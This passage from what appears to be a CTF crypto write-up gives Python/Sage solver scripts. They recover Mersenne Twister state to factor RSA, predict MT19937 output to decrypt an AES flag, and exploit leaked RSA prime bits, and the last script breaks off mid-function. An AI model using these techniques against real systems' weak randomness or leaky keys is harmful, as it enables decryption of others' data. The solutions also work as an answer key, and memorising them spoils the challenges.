544937610110319318485732752819003299421900030583201619755186005418563198983178922830516722630658659738570688423587906326520697827239870483140381321035311084086872965680985895264808839131965351704781276541438910273061170401708989341983455583148675268945159916067944049744805262336310315984482684477033006734287</span><br><span class="hljs-string">5635003138990118507194506070175086831788576611651929217926664518872856396687497543355452282932759792957815071333069987192436081970967301109108636547955400620912244311244917063515500624803643902206301188548901042409824866123277584384961209855675044800618682367677428510425729333590673520619706804051348640739 216744037211012509915361607447276981890614637104708083303422302996997658600655325492799426696396129495740380030328486134561677905050895542824084902986133831827678164847190414920208201189028697970734101241668427915881431218718486605095651504942024880541330783245275847421981881418579001271393784051391703426641</span><br><span class="hljs-string">42911212495890251189243677773682023641022813626312578449123776026147091248993904833237700742589532896024024290404122897946672451644535270088285040557715419433742408043822628453894022912746599564701384030731888203683342200542550299021286164291609827209395613247858235556551967071480178477133096158123879827699 358625812085590413825860316781088505612223852757468112073999439178735803245018313087878704846077887688463179850461438873261474235563220723161414348183847290126780153336526214025645436877174640254582752642464699350692290355463838062957644227630261763964930791440438099097640358707938365934460765509770713422802</span><br><span class="hljs-string">76393649631519338646914577444953093042692772742019473672660460181129677128343169843350211463697634615281051117955282687134957585026912161500321667521577171255986824727912674810018184784281896427202094684250866650111325600908495879530295097533881586073569958225485019114664641193908557023741440163457101525203 329857997030576972729986815876777011654061886138716155424533348668225264710995265453134377944058890193085147694227229106567976594481366856016163332702128728982600129466565167735283489379015199424332093096162272256722421083932784837620468049877168507039726118947169347011547142986416984741443370137649949904461</span><br><span class="hljs-string">79331720524907914908041917436319036255433828287857696014126718015259444328868691897077115926451094233087906865422458137916362681754241848523015955481140065721679824678490152910531795497192050173146826300375546645932629884190392808650921115445830421927238985963684104496062702531620988113510613763043301631209 521812627987763620197812504899506910796946504850708570349667428211492401785051233252744740254058319678959842396710646375803470815528610618211136953181796072686187773678649762524131730689630306575027480171902373722358678386430941181209464823845330723780859962168995759134414896419704465387883718956885830089204</span><br><span class="hljs-string">34982047515239854027766260430773762615551551624040650169394931537920509836795394460680530502277933252344187876902284046236616780767724165813414385632503982500888235012434695560644146038269348824756839799255778718600829638272259933042402900324341026396868817418250681063616205184019449176410323763562609906256 620605218346899770429088593442355698411635752845778736545505196875522232769153705673917137123151382118878693457232039690080398947092819660645917999264381455940649845030563994094759265923737413658758514560434230280086651591011706752452769554749328591613510563389443179182520711924593818729897121279090347342924</span><br><span class="hljs-string">152419925215633402551037300484006425703951620959940334562270582763998688826301000834158083436618204487451531847804246279293440954881219913553470971941979760351736535195521294640333019382215259554425750740788262905693120027837778006639912907313405166887419201498400381605572044667968915799849914769886304855469 534016646028730727016209888504911167747835078463480349483097394578844831015450227232096300754745773717118904569821782762146568167060585024245190142726454552015507956174745334336178848983708347742569471390328051491668238788357493167057460607669219247924675410096486695085439718252206048534436114032676610106347</span><br><span class="hljs-string">7879488845815070796446980042322339499701160196159748256186513316298957679171765636643576866967308539398870809808590995575054707633585889782359230149070757943670854204408729244422811261494912348733104477093541158692065916137178255072991528458124264991587844119002172895462900656781795781239777162351236329010 88871679849011995091477347542680893996957786653924621705917895209560005458566552006873467270402185918706978818367798743110976595300781848502254399030378598802075501163781912730014790884964070072432678736909128727529050058640555516131888412874572332236693843543870582425734398659970857777429709921292338764056</span><br><span class="hljs-string">127514038284722450386599280575918286761060061225148526034466492640545892790142008459404252129894996614536417849770574953585543450549469396103606474736901175227788222676384874264401431651217507860669506781393523454290522077615631381023377385798837961138591946856445250933293025411868935836885350047926486897489 77024841353020037736072564671223528105040202905964518913084686725674447555778849580882283151820241410917813178127609045792603404416216635536183501218256797138848233777386900397758052436048023588018973775841429672943588531118120531410941119451112420484244073744860360930771612798228353879418110447613074103121</span><br><span class="hljs-string">73523397212562449962797322407800812476585158706372414597501601851658987192829920809491154804458216832212324494892234069944533082031068984251998442644045753330748501446440305199570609290581400456976816997103538669480916305434314437973807842397862244118575425198027445648296131215572682266387781847672276278105 358131172545144245017725954943677533669555698100417873957892816178502113778385580423968891034087567143540060215845324391804373505677355257229040486254496477702089813554705646138200115877254745085768546159462550014224359419574896275660358462631189412166193397952134507043404147073495973377634175173793168251233</span><br><span class="hljs-string">147348014782035263557672447461924770257688598176948741569841957313948631675235455168853571742962013610522674191595258437726941866803703946285611136667070559549648062172513441677274884328986422767953568184453855423313870118663236611714535321243624425127415452246621538957156768109051856015526921750034402814181 595636882372433751112400377321820719222073583356736222414778628384644623278463447644996314505722523949309416112422725194730843858188224367723911893838329601709038981556011159397788345709995936511801237268248578658463705897357408752571102163768839107050797667376601808299838509114230891979045461260911946415320</span><br><span class="hljs-string">107396275167806069862891568873373042687841775147343147252292584080352003252925523814251826627764872245643578589633919368796490434000761591564932634968812847926559005905574630301932715978159346119216934096015784765061798867698507880003720720252714582289061793936959096457352973294797409716470781535683208662390 395153432543738329086362624068574193255148332584492341243454102818775521905404929692387305225461869410602734064349062513722129355095148212452014041134124275764033437990333449975234478218955405224252839531173866658663372361601107447751367104423527019655871175001744848253584734158351726745551407103825286804486</span><br><span class="hljs-string">111553464316331929637928443274530253217732988900086332463018159619552721468104642096142476958790984335379754112570481423047457696400188847850295271972015619208861578167810076654492163584804626343101458265888573313262592215690879907819608901681957001286346406746245896172209892822686784252329450759497940157817 511651161619212591638982125008326295422605195202233521320827338823708335474320214987121320809834264020752488400694820412703895872293388034242395958165882000777796549830919064001864919411540442573874044781198129468230793584507078981976925332170577699344654086418908951152825866266645119298895702972413286583958</span><br><span class="hljs-string">152943203796417374728939496393486026220901654584673108139041097288333960510566510856084351323729904924640199712274885275910827036984793221821982353991291820643933058458639690879406578278096815789977814737418245161029735350306516366692394206323956675431185964629143452067819609148096407834611672577927865412392 601919715680710925447421076338078877766683489886991843150153117466383328925764100913643134608445665513170565014760605822708267601346612031986281277217875335899155526135282569237278337539198315798958944970975021604720637053079350115793916435033122479416157536224071649845398032404766802667331247026412465230897</span><br><span class="hljs-string">166939346435092804149361985966477026395490869535977170373479116381554623702088662590719710620315106535772321371981485114999353813392487182004380368980412304867141197881584179316802946420573712884869207029807032629508803275758495901655593573546020371363238621118513519707566850164838945538265367877703756561143 234820987787318061334406237477763453845428872967687650137534289159784627741552971152526376041477941966693305257682995443922827379938186523574311761092208293391813942996139561570362972331975732091581332378414745250571717259039007898729580445364373819332663464831222506646891337600543033325723536694430603794811</span><br><span class="hljs-string">26423433781831557303965218555715659459964805457875828323769054957811368313465747671809917056868138188812894920739462390440860614780050790166810205409831687879766298929374237068956851330280802672993787657036328401560347701569533751904003924033296103431436132762238032533631035466975563403490612905290747500034 564564388847953966153849841262670748320376369154008357907963983929690302350574296789978591185246923974920161797995189321841257011791368992972604074119872162539552292552362460968499190796503841035750507639233595470833894116053816701560762298879109510469040808411623441894361241720213857716595525048872499260906</span><br><span class="hljs-string">67047973882442026847054596043723251652019181826511387455752441275468608245799296406017022023236054643173589545621722148324431435563020855357273526765167504290556087855144498047600331414488129605467552541562176094510433084299150667280746009871632940612151871433089450237469253872190728223812058292760792048327 190023992656957817692909813007060815279103259429273681430127196398700351704377473750794054807013341268132331757606642253453911294388801612173064841530999650755116853772677649649669913317951539550313189351839325961495963700012333982508285993230904890545000476087981313109451079110864357972818329854737276461934</span><br><span class="hljs-string">105924866908333941056520542136279835222849349889633638544229314020165638653054683617844504431167584527725854457445810982830025832114705779346552001573819055283000133195971409988231558773967828820675125138322725072735898886865540351014422681184954059397593545246946913932272750078695992276555307091275819914167 590597067702351181983043135203878889479903130263737024839941242154123057325926009112777887235038694551309864253859910817785607380293492455212053557033975616644911248422981687394189486917578693691299595122658518879946708562394161159104748320544408107959224087679644857953504156164164979544525935685064483284685&#x27;&#x27;&#x27;</span><br>p = <span class="hljs-number">667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029</span><br>c = <span class="hljs-number">9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912</span><br>N = <span class="hljs-number">11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_shift</span>(<span class="hljs-params">x, shift, <span class="hljs-built_in">type</span>, mask=<span class="hljs-number">0xffffffff</span>, nbit=<span class="hljs-number">32</span></span>):<br>    res = x<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit//shift):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_extract</span>(<span class="hljs-params">x</span>):<br>    x = inverse_shift(x, <span class="hljs-number">18</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    x = inverse_shift(x, <span class="hljs-number">15</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">4022730752</span>)<br>    x = inverse_shift(x,  <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">2636928640</span>)<br>    x = inverse_shift(x, <span class="hljs-number">11</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">x</span>):<br>    y = x<br>    y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>    y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>    <span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_twist</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">state</span>):<br>    mt = state[:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>        y = (mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            mt[i] = mt[i] ^ <span class="hljs-number">0x9908b0df</span><br>    <span class="hljs-keyword">return</span> mt<br><br>res = [[<span class="hljs-built_in">int</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> i.split()] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res.split(<span class="hljs-string">&#x27;\n&#x27;</span>)]<br>X = [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br>out = <span class="hljs-built_in">sum</span>([[<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>)][::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> X], [])<br>out = out[:<span class="hljs-number">624</span>]<br>out = [crack_extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out]<br><br>ans = <span class="hljs-built_in">list</span>()<br>out = crack_twist(out)<br>ans += out<br>out = crack_twist(out)<br>ans = out[-(<span class="hljs-number">640</span>-<span class="hljs-number">624</span>):] + ans<br><br>ans = [extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans]<br>A = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ans[i:i+<span class="hljs-number">32</span>]][::-<span class="hljs-number">1</span>]), <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">32</span>)]<br>A = [<span class="hljs-number">0</span>] + A<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    n = <span class="hljs-number">21</span><br>    res = <span class="hljs-number">0</span><br>    tmp = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        res = (res + tmp * A[i]) % p<br>        tmp = tmp * x % p<br>    <span class="hljs-keyword">return</span> res % p<br><br>secret = (res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] - f(res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])) % p<br>Q = N // secret<br>d = inverse(<span class="hljs-number">0x10001</span>, N-secret-Q+<span class="hljs-number">1</span>)<br>m = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, N))<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="colorful-matrix"><a href="#colorful-matrix" class="headerlink" title="colorful_matrix"></a>colorful_matrix</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">ns = [<span class="hljs-number">38630062416586710341458654419912504176237737247477839749085033080367529539859992076587411537805430366799412095876782912512744262957062106155418341531142309858429218208463637096843365217114990765965110566415965985105403996944993619708417839598461935470469097206342256014086162845948208599334925650727933097059538199199685364793545286980392966271769914201657672004082101110775504946586957241075964270454872257405872181588544468173017149763827540561921126826597515171761064800381983526515300315517818122598179574900255685121991744205071544970</span>, <span class="hljs-number">41522753602903133841910260331594875922287719226997542592715810409935551768308104573333760854332533376702631593490915962706512143045107096658851885513727202513616813054397657610854303071682604806070009002234312854968365250748142324994926715544722158698813288131533399544263105858513134170084625526223987620550110255872688155827773099232631041345207194483609514502522566888883736218471849075697433311580004701384847571029783514418685068903758509270527252444771313048094566344002411364378658592832008194309873599342916391769027015343562030852</span>, <span class="hljs-number">41542983120532762175372001624404625565366126179958909731196555044290633581761361918706298428954501507557598076910710787422049443564800530253137695341299743714514361560156305534490483794181933110893966453220306980682146624294992100948497284459992930850081254114996830645068636306625330524465991656430799359422407117440063911943625477783216502523414967017151717597372146324488526509879620785458016456593044828784565522423332830549325397893426472247197776412026158371655860380929692662547882654137064941217130915364306358205055760044763651406</span>, <span class="hljs-number">42853015443318352230776688785915441259875645365236808434164117288657978345098324019250085686482568413223085548506789311679316323466083886556772338612177680666217592255234589446979456714341877135596118517098603502394776049958587301113539552072352462301070489369653155854389890761241450743607560719433910573462283304103064437843063566946231984094581307498714742271881862348689297267558023093643893310002803310596286441071314219020032740336515363830250477649030557311461077069407775907176409762823453607196260454965048316567154365877848652918</span>, <span class="hljs-number">31152961872836435078296602982779340735140569916125711058616435902653202922218293684857125091648631460215120167354825278469413413558325850576700866199515219603448136082693185200558425103833947831228064760642508443585470729998592994719564254894176473779555436230174300038353978808432410463449170865897259181312953584408177790825688497584119467820716449210429423337019604137134889051973100340798405991782200038835066294194815913887924272593864934325496116821854183293510325217934617021428710898873475027666892706022106386340733691632884942848</span>]<br>A = [<span class="hljs-number">12789809461864875489953273982997537541385904671489556544122095227619591140533414669794423644619127980362623481580128258914287474542792728686579090501397390</span>, <span class="hljs-number">10463950513938701625808784986819665844287315724639315128677227520960105897990256530542006653611594269012930935073966767351788182657861624733138283749460454</span>, <span class="hljs-number">5253244650607533810967862436125419800679723144526973463211784033045021824966560017919956773745212139142517766154626849426827164032731516615725539069585525</span>, <span class="hljs-number">5644589184984504085855423002268477365020278981591337230721358313393863912025011466727192648804002734561676112555123877764178690726130713927642577324443238</span>, <span class="hljs-number">4231732567865883627242742552738439372803539125622706171540910152922080004603138662537022248675968288205781990968838888633816697065257733344028576518431020</span>, <span class="hljs-number">2483388920404524165854675814798022834892112957478917588986471421083048888193527751575039626887367465858751417977246719312923814782809309525841102293919541</span>, <span class="hljs-number">3252353812256192711411255830105475125944842449239880454539397067913664088094160819193268643401968970009466652179043139341471403913410402646923633696154454</span>, <span class="hljs-number">11575010486066232687430367040977113580882826853104996856464797182632266635060724100357205810604915010810884387573114266349621457564659060272935537811111850</span>, <span class="hljs-number">116107444921917032985259963199427176510900273385517435613848456370557161312731449337837406563733552524777525870560544042690403987311424820755256727586807</span>, <span class="hljs-number">5859050133610438843641532306693688255014116940390205022708310454673159702673207152462501010791971695002865650407033762568636006764435795015869726867643634</span>, <span class="hljs-number">5954075553161305677556950650395792531753502207483036473422070018485916621872566706504374038792527687442272405589975343003802956899043321092006127828986114</span>, <span class="hljs-number">4571747544457157571652286537158051402285727327066029382085461714597609990601683125994983291866807816649968826930652068427193317966970789937746419206862747</span>, <span class="hljs-number">7166507561570980603812241332170524724051295937096000768984168029904561160020043035660087151672164814332446644696618077835020463308343415953131944864257266</span>, <span class="hljs-number">4852042788460566411381271873349329096978244586097817622748766708426751073559942708861852208085367014057217116211249133109246735634468823924185525972777655</span>, <span class="hljs-number">11962941918999276757181090570698839032103646409734781047194175833198626142790676141060052011581957980660140931408560130449153056874213033784715711461403345</span>, <span class="hljs-number">10324508881746579337486319574059121005227580732153432145860775835052420139026016902518605634385512021513380467928195663920843022679549517463264144660593354</span>, <span class="hljs-number">13276257094435850052122403884510025189232513948002582716865201271569293297601525601586036713056700716929820641888489806178376555435219630186396004003438962</span>, <span class="hljs-number">6525051273399089095687950615197786094425890004112675057642687348101531212837185750558500720306108976630502328600886080197626115513445112562084719104488315</span>, <span class="hljs-number">12922888505610354933000354792496863801007995464403098763485264334670452387681468617068312646367483171083114539083453125614861357751571161533921864394641576</span>, <span class="hljs-number">9489726784141062031514945333087338495823600723655465328127755755022980083351477888038160719541864899912899592065620071698977397662002448273876711116012763</span>, <span class="hljs-number">10630316198843195148937849513165933809121991192035364160395429088101265852052098101114542104327663563661384303617672183366879116750889320604308038959012109</span>, <span class="hljs-number">12675564142993964272844760955973914547747654087592111324261755301551267959231076883765863344473167582531968290671984039948163579495803204811731286282708940</span>, <span class="hljs-number">11847724105274460405216443356582445218232627275228120716891711887600046501095390733716854871561352002320819466803698088448952127166615410820121973485089326</span>, <span class="hljs-number">5131676593756685549522564504727003861447389891839469018437277330988047271086971907217360711863971849879439418231726349935396008040776952541710218842744018</span>, <span class="hljs-number">8049060452950901277510497437779182190254362319091882684392717180429468875432078713802857488901441344429723298843967365750616860588029426099852763482179470</span>, <span class="hljs-number">2365060249260571713545479629411006471094806409182638354076861269679377537605360223984548798658469783472746989448405310909017645138161178501458084966625559</span>, <span class="hljs-number">7467521246204465304438401242342633361751371318557249418344587207503257890765643838557008735305668588521988487342275527781708126255070883848829062790678347</span>, <span class="hljs-number">5841608816993144092409175658260479687582056537041472535819914412630519543198558564258699185557903902095773598614097026740427138629173672250387442834578787</span>, <span class="hljs-number">3935779917509948624841228665498558015416911059417306651751360048412619176423173794541812556512582747588138532941031730797102738268660078594473168666677171</span>, <span class="hljs-number">1459083415233950534805962555425717865938763752937036513111696179351002303817986848490146888626704327653287774806488952733813718461674376764427084478395399</span>, <span class="hljs-number">6426876689549337938550615491086475536072547585103523407263007393570982327518298678278232288342601754164640081474537962710401178482959474762541185760732929</span>, <span class="hljs-number">5241364650650467046722868257809607948071188801137204831449976666385482519613365369974704486723941517654753205012497273820309153659423928739972270634209996</span>, <span class="hljs-number">6387483223002092292686097811446217867743566298067033295601210265979889577756648605354064672061975949925472022416479935990178719227937307079186916383092053</span>, <span class="hljs-number">170562164015232424518655058158727202269056868720093972639058422975773575660534168774299548952867348396798580779605954510297102765330549642318362861226163</span>, <span class="hljs-number">10004133230245713370426176448219282796530473722412487408402635996842671302539458739305597027107498342509248085998067976408732789438099488867425813748783724</span>, <span class="hljs-number">12325342879747412722323355648741345730921040452129462974449188258885453690169624888480720109964630270938743431623479816739889661554987977051169401841580388</span>, <span class="hljs-number">641543989928732942291347866597230552820621633110802944556141221591498546555080480758772801043509130524233886009444044150447511986129019395067102094826363</span>]<br>B = [<span class="hljs-number">108715652691370707411987210267535348806</span>, <span class="hljs-number">131676833696101475747102644851662113271</span>, <span class="hljs-number">122436706338521558335484593966234623745</span>, <span class="hljs-number">255864866572301552398412638474857375629</span>, <span class="hljs-number">81098761191414480003681301866161112100</span>, <span class="hljs-number">322322463176364397336266169283851913620</span>, <span class="hljs-number">198167679309202772183020662350938553923</span>, <span class="hljs-number">326360662842236388778385468938922853242</span>, <span class="hljs-number">241812832858991643670485138860832357660</span>, <span class="hljs-number">69768236619183466076110136290750715548</span>, <span class="hljs-number">32383134960394164339076842474280712870</span>, <span class="hljs-number">147747232748027508904245311745435517130</span>, <span class="hljs-number">25327826075608705748116808975774398964</span>, <span class="hljs-number">65295332681674581261444632606267440749</span>, <span class="hljs-number">236756211690281667988216748814564193312</span>, <span class="hljs-number">106435149910135092172124474857722935730</span>, <span class="hljs-number">270727089812520941022075406571244846193</span>, <span class="hljs-number">206881193220261276126028739930244917728</span>, <span class="hljs-number">131961838897694897398340205404861333362</span>, <span class="hljs-number">219211823942216355573832791993673934321</span>, <span class="hljs-number">150960424777134558142309786444952807101</span>, <span class="hljs-number">51112048255939343109218372373173385772</span>, <span class="hljs-number">182065623911902509203036774197184164110</span>, <span class="hljs-number">168420344895532090057957641972492853410</span>, <span class="hljs-number">301808673225362418769168353084541667053</span>, <span class="hljs-number">132272458662433671393247350648662880688</span>, <span class="hljs-number">495672626901999558635736361346563007</span>, <span class="hljs-number">182444159345379042372018248514964944782</span>, <span class="hljs-number">144584137563407779776361378564517880036</span>, <span class="hljs-number">338518705859818740467225748906995999694</span>, <span class="hljs-number">205885429741815676881969528495365151019</span>, <span class="hljs-number">233897982464483450790005953366237992668</span>, <span class="hljs-number">279307677123402840425362992920185630901</span>, <span class="hljs-number">133493426228159673166382443820069696429</span>, <span class="hljs-number">316624110847744871475435405969944304329</span>, <span class="hljs-number">187931604382397525131117897387179435812</span>, <span class="hljs-number">220019728924915067987393012581921164417</span>]<br>enc = <span class="hljs-string">b&#x27;cTmkMb\xfc\x05|\x1d\xc7\x13\xbaSe\xe0\xbd\xc0\xd9\xa3\x8cwo\x82yN[B&amp;\x80\xd7KPwQ`\x9c\xbf&lt;y\x8e\x8a\x97e\xa074\xb2&#x27;</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> mt19937predictor <span class="hljs-keyword">import</span> MT19937Predictor<br><br>p = <span class="hljs-number">293423658885957174953198318664231534672400520068303593221989900395768107225130267646792968959460384248015583618158947268381852534151783869878808621629530642974652628810907251607210136313789978156955302211733219987661815438401343683</span><br>key1 = long_to_bytes(p)[:-<span class="hljs-number">64</span>]<br><br><br>predictor = MT19937Predictor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ns:predictor.setrandbits(i % p, <span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A:predictor.setrandbits(i, <span class="hljs-number">512</span>)<br><br>iv = long_to_bytes(predictor.getrandbits(<span class="hljs-number">128</span>))<br>aes = AES.new(key1,AES.MODE_CBC,iv)<br>flag = aes.decrypt(enc)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#flag&#123;86baa4ed-5ec7-11ee-ae14-ac1203ab14da&#125;</span><br></code></pre></td></tr></table></figure><h2 id="LeakyRSA"><a href="#LeakyRSA" class="headerlink" title="LeakyRSA"></a>LeakyRSA</h2><p>先求出p和q的高位，低位用copper，中间用爆破，epsilon=0.01</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python">N = <span class="hljs-number">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923</span><br>gift = <span class="hljs-number">2223117424030234543005449667053988296724455736030907136592525175314696509716321</span><br>gift &lt;&lt;=<span class="hljs-number">250</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(N))<br>ok = <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pq_xor</span>(<span class="hljs-params">tp,tq,idx</span>):<br>    <span class="hljs-keyword">global</span> ok <br>    <br>    <span class="hljs-keyword">if</span> ok:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> tp*tq&gt;N:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> (tp+(<span class="hljs-number">2</span>&lt;&lt;idx))*(tq+(<span class="hljs-number">2</span>&lt;&lt;idx))&lt;N:<br>        